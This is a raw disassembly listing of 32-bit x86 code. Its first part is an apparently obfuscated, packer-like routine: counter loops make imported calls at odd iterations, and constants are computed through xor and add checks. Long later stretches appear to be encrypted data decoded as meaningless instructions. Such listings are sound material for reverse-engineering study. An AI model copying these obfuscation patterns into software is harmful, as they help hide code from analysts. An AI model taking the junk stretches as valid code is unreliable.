  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x4305a6,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e866,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e866
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e866,ecx
  403899:	cmp    DWORD PTR ds:0x42e866,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e866,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42eadc
  4038bc:	cmp    DWORD PTR ds:0x42e866,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e866
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e866,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ef28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ef28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ef28,edi
  403903:	cmp    DWORD PTR ds:0x42ef28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42eaf4
  403920:	cmp    DWORD PTR ds:0x42ef28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ef28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ef28,edi
  40393a:	cmp    DWORD PTR ds:0x42ef28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ef1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ef1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ef1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ef1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ef1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42ec9c
  403988:	cmp    DWORD PTR ds:0x42ef1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ef1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ef1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ef14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4305a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43058e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4305aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4305aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4305aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42eae0
  403a03:	mov    edi,DWORD PTR ds:0x4305aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4305aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ef30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4305aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43065a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43065a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43065a,edx
  403a58:	cmp    DWORD PTR ds:0x43065a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42eaf8
  403a77:	cmp    DWORD PTR ds:0x43065a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430642,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e85a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43064a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43058a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430692
  403aee:	mov    edx,DWORD PTR ds:0x42eab0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4305b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ef1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4305aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4305aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4305aa,edx
  403b28:	cmp    DWORD PTR ds:0x4305aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42ebc0
  403b43:	cmp    DWORD PTR ds:0x4305aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4305aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4305aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4305aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430642,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430592,0x430652
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43058e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43058a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4305c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ef20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ef30
  403bc5:	and    ebx,DWORD PTR ds:0x430652
  403bcb:	mov    DWORD PTR ds:0x42ef30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e85a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e85a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e85a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e85a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42eafc
  403c05:	cmp    DWORD PTR ds:0x42e85a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4305c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43058e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43058e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43058e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42eb00
  403c4d:	cmp    DWORD PTR ds:0x43058e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43058e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43058e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43058e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43058e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43064e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43064a,0x4305c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430586
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43064a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ef24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43058a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4305ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e876
  403ce8:	adc    DWORD PTR ds:0x42ef10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4305aa
  403cfb:	sbb    DWORD PTR ds:0x42e86e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0x24c8cd93],0xfffffffc
  403d2b:	mov    al,ds:0x7e7e11b6
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403cd4
  403d35:	mov    eax,0x5a8a283e
  403d3a:	push   esp
  403d3b:	(bad)  
  403d3c:	hlt    
  403d3d:	js     0x403cf8
  403d3f:	(bad)  
  403d40:	das    
  403d41:	jno    0x403d4c
  403d43:	mov    al,0xec
  403d45:	in     eax,dx
  403d46:	jl     0x403d5b
  403d48:	cmp    ecx,esp
  403d4a:	jno    0x403d29
  403d4c:	icebp  
  403d4d:	fimul  WORD PTR [esi-0x4c]
  403d50:	(bad)  [ecx]
  403d52:	ret    0x4096
  403d55:	mov    cl,ah
  403d57:	push   ebp
  403d58:	aad    0xc7
  403d5a:	retf   
  403d5b:	jl     0x403cf5
  403d5d:	les    esp,FWORD PTR [ebx]
  403d5f:	loop   0x403d22
  403d61:	xor    eax,0x1288468
  403d66:	(bad)  
  403d67:	(bad)  
  403d68:	(bad)  
  403d69:	inc    eax
  403d6a:	repnz sahf 
  403d6c:	jo     0x403d21
  403d6e:	push   ss
  403d6f:	sub    al,ah
  403d71:	dec    ebp
  403d72:	int3   
  403d73:	cdq    
  403d74:	jg     0x403d95
  403d76:	pushf  
  403d77:	xlat   BYTE PTR ds:[ebx]
  403d78:	(bad)  
  403d79:	mov    ebp,0xced37912
  403d7e:	mov    cl,0x72
  403d80:	cmp    ebx,DWORD PTR ds:0x9b7d996a
  403d86:	test   al,0xc9
  403d88:	add    DWORD PTR [edi-0x7],eax
  403d8b:	rol    edx,1
  403d8d:	in     eax,0xcd
  403d8f:	outs   dx,BYTE PTR ds:[esi]
  403d90:	cli    
  403d91:	sub    bh,dh
  403d93:	lods   eax,DWORD PTR ds:[esi]
  403d94:	sbb    al,0x88
  403d96:	out    dx,al
  403d97:	sub    eax,0x999a53e8
  403d9c:	adc    eax,0xc7169227
  403da1:	and    al,0x96
  403da3:	fdivr  QWORD PTR [ecx+0x12]
  403da6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403da7:	shl    BYTE PTR [esi],cl
  403da9:	int3   
  403daa:	out    0xb2,eax
  403dac:	aam    0xea
  403dae:	scas   eax,DWORD PTR es:[di]
  403db0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403db1:	mov    esp,0x7ffc6911
  403db6:	push   eax
  403db7:	adc    ch,BYTE PTR ds:0xac3bde48
  403dbd:	cmc    
  403dbe:	dec    esi
  403dbf:	mov    bh,0xf5
  403dc1:	les    ebp,FWORD PTR [eax+ecx*4]
  403dc4:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  403dc6:	or     edi,edx
  403dc8:	mov    ebx,0xa507487a
  403dcd:	retf   0xcb86
  403dd0:	cmp    al,0x83
  403dd2:	mov    DWORD PTR [ecx*4-0x7edb535],esp
  403dd9:	mov    ebx,0xe6179022
  403dde:	loop   0x403e0b
  403de0:	push   0xffffffc0
  403de2:	and    al,0xa2
  403de4:	hlt    
  403de5:	lea    eax,[edx+0x54]
  403de8:	rcl    DWORD PTR [edx],cl
  403dea:	mov    ah,0x1e
  403dec:	mov    ?,ebx
  403dee:	test   eax,0x1e6afad1
  403df3:	mul    BYTE PTR [ebp-0xd9a6a5a]
  403df9:	or     ecx,DWORD PTR [edi+0x76377d42]
  403dff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e00:	jno    0x3e6eb647
  403e06:	jb     0x403e1d
  403e08:	push   edx
  403e09:	jb     0x403e08
  403e0b:	adc    eax,0x1edd4bdf
  403e10:	fadd   QWORD PTR [ecx]
  403e12:	and    bh,BYTE PTR [edi+0x654a1eff]
  403e18:	rol    DWORD PTR [eax+ebx*4+0x521cb94c],cl
  403e1f:	or     bl,BYTE PTR [esi+0x70d457a]
  403e25:	sbb    DWORD PTR [edx],ebx
  403e27:	sub    al,0x33
  403e29:	lock mov ebx,DWORD PTR [eax+eax*2]
  403e2d:	mov    ebx,0x665f5236
  403e32:	test   eax,0xceaea5ad
  403e37:	and    al,0xf0
  403e39:	popa   
  403e3a:	in     eax,0x8b
  403e3c:	pop    es
  403e3d:	cmp    bl,BYTE PTR [eax-0x44]
  403e40:	sbb    bl,al
  403e42:	bound  esi,QWORD PTR [ebx+0x7c]
  403e45:	hlt    
  403e46:	mov    bl,0x24
  403e48:	inc    ebp
  403e49:	nop
  403e4a:	test   DWORD PTR [ecx+edx*4],0x665d38a7
  403e51:	mov    ds:0x5abcad80,eax
  403e56:	scas   al,BYTE PTR es:[edi]
  403e57:	inc    eax
  403e58:	enter  0x32b6,0x63
  403e5c:	dec    ecx
  403e5d:	xor    DWORD PTR [eax],ebp
  403e5f:	ja     0x403e5d
  403e61:	xor    edi,DWORD PTR [esi-0x13]
  403e64:	push   esp
  403e65:	mov    esi,0xec8101cf
  403e6a:	test   eax,0x6f4a9aa0
  403e6f:	mov    ch,0x8d
  403e71:	aam    0x3d
  403e73:	cwde   
  403e74:	sub    esp,DWORD PTR [edi+eax*2]
  403e77:	cmp    edi,esp
  403e79:	mov    ebx,ecx
  403e7b:	jb     0x403ed5
  403e7d:	and    DWORD PTR [ecx-0x3a],0x45a6d0f0
  403e84:	loopne 0x403ecd
  403e86:	add    dh,BYTE PTR [ecx+0x5a863f29]
  403e8c:	or     cl,BYTE PTR [eax+esi*4-0x23]
  403e90:	sbb    ebx,edx
  403e92:	adc    DWORD PTR [edx+0x22ec29b6],eax
  403e98:	push   ss
  403e99:	push   esi
  403e9a:	and    al,0x91
  403e9c:	xor    edi,DWORD PTR [edx+0x4d]
  403e9f:	and    al,0xb2
  403ea1:	jbe    0x403e9a
  403ea3:	mul    DWORD PTR [ecx]
  403ea5:	push   ecx
  403ea6:	pop    ebx
  403ea7:	aam    0x4d
  403ea9:	add    eax,0xee630f31
  403eae:	xor    al,0xf5
  403eb0:	xor    DWORD PTR [esi],ecx
  403eb2:	stos   BYTE PTR es:[edi],al
  403eb3:	and    al,0xe
  403eb5:	fcomi  st,st(3)
  403eb7:	mov    ah,BYTE PTR [ebx-0x27d1b8f5]
  403ebd:	pusha  
  403ebe:	lods   al,BYTE PTR ds:[esi]
  403ebf:	jge    0x403ef4
  403ec1:	mov    edx,DWORD PTR [ebp-0x28]
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0xb97278c4,al
  403efc:	cmc    
  403efd:	shl    DWORD PTR [edx],0xc3
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403ed5
  403f08:	sbb    DWORD PTR [esi+edx*2],esi
  403f0b:	adc    DWORD PTR [ecx-0x7b],esp
  403f0e:	aad    0x2b
  403f10:	push   ecx
  403f11:	call   0x74d8:0xce7670e2
  403f18:	sbb    al,0xdd
  403f1a:	jbe    0x403eba
  403f1c:	sbb    eax,0xdebeef7e
  403f21:	pop    esp
  403f22:	jle    0x403efe
  403f24:	rcl    BYTE PTR [edi],0xa
  403f27:	fcomp  QWORD PTR cs:[eax+0xb]
  403f2b:	ins    DWORD PTR es:[edi],dx
  403f2c:	push   eax
  403f2d:	gs pop ds
  403f2f:	or     DWORD PTR [edi+0x4d29513a],0xfffffff5
  403f36:	out    dx,al
  403f37:	push   0xffffffba
  403f39:	adc    edi,DWORD PTR [ebx-0x38afe0a1]
  403f3f:	push   esp
  403f40:	ret    
  403f41:	sub    eax,0x5e287ef0
  403f46:	jbe    0x403efe
  403f48:	test   ebp,ebx
  403f4a:	(bad)  
  403f4b:	shl    ch,0x60
  403f4e:	pop    ebx
  403f4f:	neg    ecx
  403f51:	push   esi
  403f52:	and    eax,DWORD PTR [edx+0x25]
  403f55:	jmp    0xb88b:0x20f3450f
  403f5c:	adc    ah,BYTE PTR [ebp+0x60cfa0bf]
  403f62:	xlat   BYTE PTR ds:[ebx]
  403f63:	adc    al,0xf3
  403f65:	test   al,0x0
  403f67:	hlt    
  403f68:	sub    edx,ebx
  403f6a:	jbe    0x403f86
  403f6c:	mov    bl,0x9b
  403f6e:	jp     0x403fa0
  403f70:	add    eax,esi
  403f72:	loope  0x403f87
  403f74:	(bad)  
  403f75:	xchg   edi,eax
  403f76:	cmp    DWORD PTR [ebp+0x3a],esp
  403f79:	inc    esi
  403f7a:	lahf   
  403f7b:	cmp    al,BYTE PTR [ebx-0x28f4b1b5]
  403f81:	imul   edx,DWORD PTR [eax],0xfbf51cb6
  403f87:	xchg   DWORD PTR [esi+0x7f210bb7],ebx
  403f8d:	inc    ebx
  403f8e:	mov    ecx,0xd1e71ac1
  403f93:	lea    edx,[ecx+0x4f]
  403f96:	pop    ebx
  403f97:	hlt    
  403f98:	mov    eax,ds:0x38ff2cd3
  403f9d:	mov    ebp,0xb7600ff2
  403fa2:	mov    edx,DWORD PTR [ecx+0x5a152d3b]
  403fa8:	stos   DWORD PTR es:[edi],eax
  403fa9:	cmp    al,0xb3
  403fab:	pop    ecx
  403fac:	stc    
  403fad:	mov    WORD PTR [eax+0x7b],ds
  403fb0:	(bad)  
  403fb2:	into   
  403fb3:	fdiv   QWORD PTR [edx+ebx*8]
  403fb6:	sub    ebx,edi
  403fb8:	inc    edi
  403fb9:	ja     0x403faf
  403fbb:	or     eax,0x54e22418
  403fc0:	into   
  403fc1:	out    dx,al
  403fc2:	mov    ebx,0xcaa98bd5
  403fc7:	pop    ebp
  403fc8:	shr    DWORD PTR [eax],0xa6
  403fcb:	inc    esi
  403fcc:	cmp    bl,al
  403fce:	data16 mov dh,0x6e
  403fd1:	lea    eax,[eax+0x3a73bdcd]
  403fd7:	cwde   
  403fd8:	scas   al,BYTE PTR es:[edi]
  403fd9:	int    0x45
  403fdb:	and    cl,BYTE PTR [ecx+0x4895d8e6]
  403fe1:	jle    0x40401d
  403fe3:	cwde   
  403fe4:	jl     0x403fd0
  403fe6:	add    BYTE PTR [esi*1+0x61454769],bh
  403fed:	xor    al,0xcf
  403fef:	test   eax,0x3fe47476
  403ff4:	lods   al,BYTE PTR ds:[esi]
  403ff6:	out    dx,al
  403ff7:	repnz idiv DWORD PTR [edi]
  403ffa:	inc    eax
  403ffb:	retf   0x78
  403ffe:	ret    0x1d27
  404001:	ds inc eax
  404003:	test   DWORD PTR [ecx-0x37],edx
  404006:	inc    ebx
  404007:	xor    esp,ebx
  404009:	js     0x403fe0
  40400b:	push   es
  40400c:	shl    BYTE PTR [bx+di+0x3d78],0x6a
  404012:	mov    ebp,0x2e84b271
  404017:	stos   DWORD PTR es:[edi],eax
  404018:	inc    edx
  404019:	test   BYTE PTR [esi+0x483f24e2],dl
  40401f:	int3   
  404020:	and    al,0x2d
  404022:	add    dh,0xdb
  404025:	aad    0xa7
  404027:	mov    ebx,0x78b60fbc
  40402c:	jbe    0x404099
  40402e:	or     DWORD PTR [edi],esi
  404030:	in     al,0x94
  404032:	mov    esp,0x2288aca6
  404037:	(bad)
  40403b:	push   eax
  40403c:	loope  0x404052
  40403e:	loope  0x4040b3
  404040:	loope  0x4040bb
  404042:	jb     0x4040ba
  404044:	sbb    DWORD PTR [esi-0x52],edx
  404047:	loope  0x404068
  404049:	adc    al,0x6a
  40404b:	jbe    0x40401c
  40404d:	and    bh,BYTE PTR [edi+0x727644fa]
  404053:	push   ds
  404054:	pop    ebx
  404055:	iret   
  404056:	push   0x5f8e65ea
  40405b:	push   0x1e06ea51
  404060:	stos   BYTE PTR es:[edi],al
  404061:	jle    0x404058
  404063:	in     eax,0xbc
  404065:	aam    0x0
  404067:	cwde   
  404068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404069:	fdivr  st(0),st
  40406b:	bound  esi,QWORD PTR [edi]
  40406d:	rcr    BYTE PTR [ebx],cl
  40406f:	push   esi
  404070:	push   ebp
  404071:	push   ds
  404072:	adc    DWORD PTR [edi-0x7b],ecx
  404075:	stos   BYTE PTR es:[edi],al
  404076:	mov    eax,ds:0x412d7c23
  40407b:	test   al,0x68
  40407d:	int3   
  40407e:	pop    eax
  40407f:	test   eax,0x47b258b7
  404084:	icebp  
  404085:	(bad)
  404088:	imul   ebp,ecx,0xffffffe3
  40408b:	outs   dx,BYTE PTR ds:[esi]
  40408c:	inc    ebp
  40408d:	jmp    0x40405b
  40408f:	(bad)  
  404090:	jns    0x4040b3
  404092:	mov    cl,BYTE PTR [edi]
  404094:	mov    edx,DWORD PTR [ebp-0x2c]
  404097:	jmp    0x404613
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax-0x6485c452]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x4040fa
  4040c0:	mov    ch,0xd0
  4040c2:	push   ecx
  4040c3:	(bad)  
  4040c4:	scas   eax,DWORD PTR es:[edi]
  4040c5:	adc    edi,DWORD PTR [ecx+0x4a]
  4040c8:	push   es
  4040c9:	popf   
  4040ca:	dec    edi
  4040cb:	pop    edx
  4040cc:	mov    al,0x99
  4040ce:	lods   eax,DWORD PTR ds:[esi]
  4040cf:	daa    
  4040d0:	fwait
  4040d1:	mov    cl,0x20
  4040d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040d5:	ds pop ds
  4040d7:	jbe    0x40406a
  4040d9:	mov    eax,ds:0x72b36cf6
  4040de:	lock pop edi
  4040e0:	shl    DWORD PTR [ecx+edx*8+0xc],1
  4040e4:	inc    ebx
  4040e5:	sub    BYTE PTR [eax+0x2c],0x27
  4040e9:	add    edi,DWORD PTR [esi+0x76ab684c]
  4040ef:	iret   
  4040f0:	xor    al,0x89
  4040f2:	lods   eax,DWORD PTR ds:[esi]
  4040f3:	jecxz  0x4040d4
  4040f5:	shl    DWORD PTR [eax+0x26],cl
  4040f8:	mul    BYTE PTR [ebp+0x50882871]
  4040fe:	jp     0x404132
  404100:	xchg   esi,eax
  404101:	and    DWORD PTR [edi],esi
  404103:	leave  
  404104:	jmp    0x9b59:0x4b6bc775
  40410b:	sub    eax,0x6bb792d2
  404110:	daa    
  404111:	cmc    
  404112:	inc    esp
  404113:	add    DWORD PTR [esi-0x33],edx
  404116:	mov    edx,0xe0fbb5b8
  40411b:	mov    ds:0x95a7dae6,eax
  404120:	mov    ds:0x87decc68,eax
  404125:	in     al,dx
  404126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404127:	jb     0x404167
  404129:	dec    esi
  40412a:	fs push esp
  40412c:	scas   al,BYTE PTR es:[edi]
  40412d:	mov    ch,0xba
  40412f:	in     al,0x56
  404131:	push   eax
  404132:	iret   
  404133:	adc    al,0x60
  404135:	inc    ecx
  404136:	js     0x40412a
  404138:	pop    edx
  404139:	out    dx,al
  40413a:	and    edx,ebx
  40413c:	iret   
  40413d:	ds dec ebp
  40413f:	fwait
  404140:	mov    WORD PTR [bx-0x42],ds
  404144:	xchg   ebx,eax
  404145:	mov    edx,0x269fa591
  40414a:	loop   0x4041c3
  40414c:	addr16 test eax,0xcc45c2d
  404152:	sbb    BYTE PTR [eax+0x5a],bh
  404155:	xlat   BYTE PTR ds:[ebx]
  404156:	fisubr DWORD PTR [edx-0xf6ff278]
  40415c:	pop    eax
  40415d:	pusha  
  40415e:	xchg   eax,edx
  404160:	hlt    
  404161:	mov    BYTE PTR [esi+ebp*4],ah
  404164:	adc    eax,0x95c5323c
  404169:	sar    DWORD PTR fs:[ebx+esi*4+0x14],1
  40416e:	ins    DWORD PTR es:[edi],dx
  40416f:	mov    BYTE PTR [eax],0xf0
  404172:	push   ss
  404173:	pushf  
  404174:	mov    edi,0xa4d5ca35
  404179:	inc    eax
  40417a:	xchg   ebx,eax
  40417b:	cli    
  40417c:	call   0x14a6:0x8c5bd3df
  404183:	add    BYTE PTR [edi],0x83
  404186:	jg     0x4041eb
  404188:	jnp    0x404131
  40418a:	jecxz  0x40410d
  40418c:	aas    
  40418d:	sar    BYTE PTR [ebp-0xc3a55d1],0x43
  404194:	(bad)  [edx+0x46]
  404197:	call   0x16906321
  40419c:	jge    0x4041f1
  40419e:	dec    esp
  40419f:	xor    eax,edi
  4041a1:	retf   0xa5da
  4041a4:	push   ebp
  4041a5:	imul   eax,esp,0x31
  4041a8:	das    
  4041a9:	sbb    al,0xe8
  4041ab:	mov    esi,0x706274d5
  4041b0:	xor    esi,DWORD PTR [eax-0xc]
  4041b3:	adc    BYTE PTR [ebx],ah
  4041b5:	call   0x22a8:0xdbad96e9
  4041bc:	js     0x404149
  4041be:	mov    ebp,0xab910bde
  4041c3:	push   0x72
  4041c5:	push   esi
  4041c6:	(bad)  
  4041c7:	mov    al,ds:0x15c243ef
  4041cc:	or     dl,BYTE PTR [ebp+0x29]
  4041cf:	xchg   esi,eax
  4041d0:	fcomp  DWORD PTR [ecx]
  4041d2:	push   ecx
  4041d3:	repnz es out 0x2d,eax
  4041d7:	and    al,0xa5
  4041da:	je     0x4041a7
  4041dc:	sbb    BYTE PTR [ebx+eax*2-0x67aa549d],0xbb
  4041e4:	loopne 0x404198
  4041e6:	inc    esp
  4041e7:	mov    BYTE PTR [ebp+0x22],cl
  4041ea:	stos   BYTE PTR es:[edi],al
  4041eb:	push   ebp
  4041ec:	adc    eax,0xa58d97e
  4041f1:	(bad)  
  4041f2:	cli    
  4041f3:	fnsave [ebp-0x25]
  4041f6:	iret   
  4041f7:	jb     0x404258
  4041f9:	nop
  4041fa:	arpl   WORD PTR [ecx+0x7c0b694e],ax
  404200:	mov    al,ds:0x49c4c4a5
